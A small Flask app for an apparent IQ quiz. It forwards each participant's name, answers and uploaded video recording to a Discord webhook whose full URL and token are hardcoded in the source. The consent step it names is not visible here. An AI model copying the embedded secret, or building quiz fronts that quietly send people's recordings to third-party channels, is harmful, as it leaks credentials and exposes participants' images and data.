import os
import json
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566422909369589892/jC5rEnmWbWzF8c6muws7A66fkM5Xr7kvo4TQxrURo0x-4d6gdbfSuEL7mQLnevOrCExq"

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    try:
        username = request.form.get("username", "Utilisateur Anonyme")
        
        questions_summary = []
        for i in range(1, 21):
            val = request.form.get(f"q{i}", "N/A")
            questions_summary.append(f"Q{i}: {val}")
        
        q_text = " | ".join(questions_summary[:10])

        video_file = request.files.get("video")

        content_text = f"""✅ **Nouveau Rapport Reçu (IQ Quiz):**
• **Nom:** {username}
• **Réponses (Aperçu):** {q_text}"""

        payload = {
            "content": content_text
        }

        files = {}
        if video_file:
            filename = video_file.filename or "recording.webm"
            file_bytes = video_file.read()
            content_type = video_file.content_type or "video/webm"
            
            files = {
                "file": (filename, file_bytes, content_type)
            }

        resp = requests.post(
            DISCORD_WEBHOOK_URL, 
            data={"payload_json": json.dumps(payload)}, 
            files=files if files else None, 
            timeout=30
        )
        
        print(f"Discord Response Status: {resp.status_code}")
        if resp.status_code >= 400:
            print(f"Discord Error Response: {resp.text}")

        return jsonify({"message": "Success"}), 200

    except Exception as e:
        print(f"Error in submit_consent: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000)
